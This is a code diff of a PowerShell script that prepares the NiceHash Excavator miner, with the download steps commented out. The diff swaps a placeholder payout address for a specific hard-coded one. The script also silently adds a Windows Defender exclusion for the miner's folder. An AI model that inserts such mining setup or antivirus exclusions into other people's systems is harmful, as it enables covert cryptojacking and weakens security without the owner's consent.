@@ -4,7 +4,7 @@
 $ErrorActionPreference = "Continue"
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
-function Log-NH($msg) {
+function Log-Mine($msg) {
     Write-Host "[NICEHASH] $msg" -ForegroundColor Cyan -Bold
 }
 
@@ -16,7 +16,7 @@ $NHDir = Join-Path $PWD "data/nicehash"
 if (-not (Test-Path $NHDir)) { New-Item -ItemType Directory -Path $NHDir | Out-Null }
 
 # 1. Deployment of Excavator (Simulation of specific version download)
-Log-NH "Preparing Excavator Engine Environment..."
+Log-Mine "Preparing Excavator Engine Environment..."
 $ExcavatorUrl = "https://github.com/nicehash/excavator/releases/download/v1.7.7.2/excavator_v1.7.7.2_x64.zip"
 $ZipPath = Join-Path $NHDir "excavator.zip"
 
@@ -25,8 +25,8 @@ $ZipPath = Join-Path $NHDir "excavator.zip"
 # Expand-Archive -Path $ZipPath -DestinationPath $NHDir -Force
 
 # 2. Configuration Generation
-Log-NH "Generating Mining Credentials..."
-$MiningAddress = "34zV8GshV6D19E7P2E9n6rGgYn8aZ9H8a7" # Template Address (Replace with your own)
+Log-Mine "Generating Mining Credentials..."
+$MiningAddress = "NHbaVtw1eCvbsZiPGZ9kqWEo4zGnNQ7UdcXm" # Updated Address
 $WorkerName = "ElysiaSentinel_01"
 
 $CommandJSON = @"
@@ -40,7 +40,7 @@ $CommandJSON | Out-File -FilePath (Join-Path $NHDir "cmd.json") -Encoding UTF8
 Log-Mine "Command Lattice locked: cmd.json"
 
 # 3. Defender Exception for NiceHash Sector
-Log-NH "Adding Defender Exclusion for NiceHash Sector..."
+Log-Mine "Adding Defender Exclusion for NiceHash Sector..."
 Add-MpPreference -ExclusionPath $NHDir -ErrorAction SilentlyContinue
 
 Write-Host ""
